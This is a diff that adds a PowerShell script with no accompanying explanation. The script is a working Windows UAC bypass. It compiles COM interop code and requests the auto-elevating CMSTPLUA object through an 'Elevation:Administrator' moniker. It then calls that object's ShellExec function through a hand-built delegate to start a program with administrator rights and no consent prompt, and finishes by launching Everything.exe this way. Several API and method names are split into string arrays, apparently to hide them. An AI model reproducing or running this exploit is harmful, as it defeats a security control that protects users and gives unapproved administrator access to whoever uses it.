@@ -1,0 +1,79 @@
+function FuncExAd {
+   [CmdletBinding()] 
+	param(
+		[Parameter(Mandatory = $True)]
+		[String]$src,
+		[Parameter(Mandatory = $False)]
+		[String]$arg
+	)   
+
+	$nick = @('[StructLayout(LayoutKind.Sequential)]', 'MarshalAs(UnmanagedType.ByValArray,SizeConst', '[DllImport("ole32.dll",CharSet=CharSet.Unicode,SetLastError=true)]', 'public static extern')
+	$memEx = @("CoInitializeEx", "CoUninitialize", "CoGetObject")
+	$sig = 'using System;using System.Diagnostics;using System.Runtime.InteropServices;using System.Security.Principal;' + $nick[0] + 'public struct _st_1{public uint u1;public UInt16 u2;public UInt16 u3;[' + $nick[1] + '=8)]public byte[] bt;}' + $nick[0] + 'public struct _st_2{[' + $nick[1] + '=7)]public UInt32[] ut;public IntPtr  pinfo;public IntPtr  hwnd;}public struct _st_3{[' + $nick[1] + '=23)]public IntPtr[] func;}public static class ExAd{' + $nick[2] + $nick[3] + ' int ' + $memEx[0] + '(IntPtr pvReserved,UInt32 dwCoInit);' + $nick[2] + $nick[3] + ' void ' + $memEx[1] + '();' + $nick[2] + $nick[3] + ' int ' + $memEx[2] + '(string pszName,IntPtr pBindOptions,_st_1 riid,ref IntPtr ppv);}'
+	
+	Add-Type -TypeDefinition $sig
+	#check param
+	[INT32]$hr = 0x80004005
+	if($src.Length -eq 0){
+		return $hr
+	}
+
+	#initialize com
+	$Ex = [ExAd]
+	$memEx = @("CoInitializeEx", "CoUninitialize", "CoGetObject")
+	$Ex::($memEx[1])()
+	$hr_init = $Ex::($memEx[0])([IntPtr]::Zero, 2)
+
+	#get object
+	$o_mar = [System.Runtime.InteropServices.Marshal]
+	$a_mar = @("SizeOf", "AllocHGlobal", "StructureToPtr", "PtrToStructure", "StringToHGlobalUni", "GetDelegateForFunctionPointer")
+	$m_st_2 = New-Object _st_2
+	$size = $o_mar::($a_mar[0])($m_st_2)
+	$m_st_2.ut = [UInt32[]]($size, 0, 0, 0, 0, 4, 0)
+	$pt_st_2 = $o_mar::($a_mar[1])($size)
+	$o_mar::($a_mar[2])($m_st_2, $pt_st_2, $True)
+	$t_st_3 = (New-Object _st_3).GetType()
+	$size = $o_mar::($a_mar[0])([Type]$t_st_3)
+	$mem_lua = $o_mar::($a_mar[1])($size)
+	$m_st_1 = New-Object _st_1
+	$m_st_1.u1 = 0x6EDD6D74
+	$m_st_1.u2 = 0xC007
+	$m_st_1.u3 = 0x4E75
+	$m_st_1.bt = [byte[]](0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4c)
+	$sz = "Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
+	$hr = $Ex::($memEx[2])($sz, $pt_st_2, $m_st_1, [ref]$mem_lua)
+	if($hr -ne 0){
+		return $hr
+	}
+
+	#get func addr
+	$cml = $o_mar::($a_mar[3])($mem_lua, [Type]$t_st_3)  
+	$cml = $o_mar::($a_mar[3])($cml.func[0], [Type]$t_st_3)
+	$f_addr = $cml.func[9]
+
+	#get func type
+	$d = [AppDomain]::CurrentDomain
+	$dyn = New-Object System.Reflection.AssemblyName('ReflectedDelegate')	
+	$fn = @("DefineDynamicAssembly", "DefineDynamicModule", "DefineType", "DefineConstructor", "DefineMethod", "SetImplementationFlags", "CreateType")
+	$as = @("InMemoryModule", "MyDelegateType", "Class, Public, Sealed, AnsiClass, AutoClass", "RTSpecialName, HideBySig, Public", "Runtime, Managed", "Invoke", "Public, HideBySig, NewSlot, Virtual")
+	$ob = @([System.Reflection.Emit.AssemblyBuilderAccess], [System.MulticastDelegate], [System.Reflection.CallingConventions])
+	$t_bld = $t_bld = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule("InMemoryModule", $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
+	$t_args = @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32])
+	$t_bld.($fn[3])($as[3], $ob[2]::Standard, $t_args).($fn[5])($as[4])
+	$t_bld.($fn[4])($as[5], $as[6], [Int], $t_args).($fn[5])($as[4])  
+	$f_t = Write-Output $t_bld.($fn[6])()
+
+	#run shellexec()
+	$f = $o_mar::($a_mar[5])($f_addr, $f_t)
+	$uni_src = $o_mar::($a_mar[4])($src)
+	$uni_arg = $o_mar::($a_mar[4])($arg)
+	$f.Invoke($mem_lua, $uni_src , $uni_arg, 0, 0, 0)#5-Show, 0-Hidden   
+	if($hr_init -eq 0){
+		$Ex::($memEx[1])()
+	}
+}
+
+$stringPath='D:\Everything\Everything.exe';
+FuncExAd -src $stringPath;
+
+
